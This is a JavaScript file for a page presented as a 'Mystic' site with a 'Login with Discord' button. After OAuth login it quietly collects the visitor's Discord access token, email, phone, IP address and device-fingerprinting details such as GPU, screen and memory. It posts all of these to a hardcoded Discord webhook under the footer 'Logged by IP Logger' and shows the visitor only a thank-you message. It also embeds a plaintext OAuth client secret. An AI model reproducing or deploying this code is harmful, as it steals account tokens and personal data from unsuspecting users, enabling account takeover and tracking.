const clientId = '1284270652693680169';
const redirectUri = 'https://semodge2.github.io/test/'; // Your redirect URI
const scopes = 'identify email guilds'; // Define the scopes you need

async function loginWithDiscord() {
    const authUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${scopes}`;
    window.location.href = authUrl;
}

async function fetchUserData(code) {
    console.log("Fetching user data with code:", code); // Debug log
    const response = await fetch('https://discord.com/api/oauth2/token', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            'client_id': clientId,
            'client_secret': 'ErVCZ3uzQn1AaUTIh1ej39JYfeAbM0fY', // Keep this secret on the server in a real app
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirectUri,
        }),
    });

    if (!response.ok) {
        const errorText = await response.text();
        console.error('Failed to fetch access token:', errorText); // Log error response
        return;
    }

    const data = await response.json();
    console.log("Access token data:", data); // Log access token data

    // Fetch user info
    const userInfoResponse = await fetch('https://discord.com/api/v10/users/@me', {
        headers: {
            'Authorization': `Bearer ${data.access_token}`,
        },
    });

    if (!userInfoResponse.ok) {
        const errorText = await userInfoResponse.text();
        console.error('Failed to fetch user info:', errorText); // Log user info error
        return;
    }

    const user = await userInfoResponse.json();
    const email = user.email || "Email not provided";
    const phone = user.phone || "Phone not provided";
    const avatarUrl = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
    const createdAt = new Date(user.created_at).toLocaleString(); // Account creation date
    const nitro = user.premium_type ? "Yes" : "No"; // Check for Nitro status
    const operatingSystem = navigator.platform; // Get operating system
    const city = "City not available"; // You would need to use a geo API for real data
    const country = "Country not available"; // You would need to use a geo API for real data

    // Call the function to send visitor info along with the access token and user information
    sendInfoToDiscord(data.access_token, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country);
}

async function sendInfoToDiscord(accessToken, email, phone, avatarUrl, createdAt, nitro, operatingSystem, city, country) {
    const ipResponse = await fetch('https://api.ipify.org?format=json');
    const ipData = await ipResponse.json();
    const ip = ipData.ip;

    // Get additional information
    const userAgent = navigator.userAgent;
    const referrer = document.referrer || 'Direct visit';
    const timestamp = new Date().toISOString();
    const language = navigator.language;
    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const currentUrl = window.location.href;
    const deviceMemory = navigator.deviceMemory || 'Not Available'; // RAM size in GB
    const hardwareConcurrency = navigator.hardwareConcurrency || 'Not Available'; // Number of logical processors
    const screenDPI = (window.devicePixelRatio * 96).toFixed(2) + ' DPI'; // Estimated screen DPI

    const gl = document.createElement('canvas').getContext('webgl');
    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not Available';

    const embedMessage = {
        embeds: [{
            title: '👤 New Visitor Info',
            color: 0xFF0000, // Red color
            fields: [
                { name: '🖥️ IP Address', value: ip, inline: true },
                { name: '🌐 User-Agent', value: userAgent, inline: true },
                { name: '🔗 Referrer', value: referrer, inline: true },
                { name: '📅 Timestamp', value: timestamp, inline: true },
                { name: '🌍 Language', value: language, inline: true },
                { name: '📺 Screen Resolution', value: screenResolution, inline: true },
                { name: '🔗 Current URL', value: currentUrl, inline: true },
                { name: '💾 Device Memory', value: `${deviceMemory} GB`, inline: true },
                { name: '🧠 Hardware Concurrency', value: `${hardwareConcurrency} logical processors`, inline: true },
                { name: '🖼️ Screen DPI', value: screenDPI, inline: true },
                { name: '🎮 Graphics Card', value: gpu, inline: true },
                { name: '🔑 Access Token', value: accessToken, inline: false },
                { name: '📧 Email', value: email, inline: true },
                { name: '📱 Phone', value: phone, inline: true },
                { name: '🖼️ Profile Picture', value: `[View Avatar](${avatarUrl})`, inline: true },
                { name: '📅 Account Created', value: createdAt, inline: true },
                { name: '🖥️ Operating System', value: operatingSystem, inline: true }, // Operating System
                { name: '🌆 City', value: city, inline: true }, // City
                { name: '🌍 Country', value: country, inline: true }, // Country
                { name: '🎮 Discord Nitro', value: nitro, inline: true } // Nitro status
            ],
            footer: {
                text: 'Logged by IP Logger',
            }
        }]
    };

    const webhookUrl = 'https://discord.com/api/webhooks/1285985396924092458/8UH3XrEDxBUqIGYkw4iC353w_0mC86uGCnvdlRyw2uhBMucajDmFEGrsm_7VCu44Q101'; // Your webhook URL
    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embedMessage)
    });

    document.body.innerHTML += `<h2>Thank You for Testing</h2>`;
}

window.onload = function () {
    const params = new URLSearchParams(window.location.search);
    const code = params.get('code');
    if (code) {
        fetchUserData(code);
    } else {
        // Show the login button if no code is present
        document.body.innerHTML = `
            <div class="container">
                <h1>Welcome to Mystic</h1>
                <button onclick="loginWithDiscord()">Login with Discord</button>
            </div>
        `;
    }
};
